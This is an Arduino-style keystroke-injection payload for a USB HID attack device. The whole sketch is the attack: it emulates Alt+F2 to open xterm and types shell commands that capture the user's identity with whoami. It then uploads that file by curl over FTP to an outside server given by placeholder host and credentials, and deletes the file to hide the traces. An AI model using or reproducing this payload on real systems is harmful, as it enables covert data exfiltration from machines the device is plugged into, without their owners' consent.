#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("xterm");
  delay(3000);
  Keyboard.println("export xfile='LinuxUser.txt'; export ftpuser='USERNAME'; export ftppass='PASSWORD'; data=\"$(whoami)\"; echo ${data}>${xfile}; export xip='IPSERVERFTP'");
  delay(3000);
  Keyboard.println("curl -T ${xfile} ftp://${ftpuser}:${ftppass}@${xip}/${xfile}");
  delay(3000);
  Keyboard.println("rm LinuxUser.txt");
}
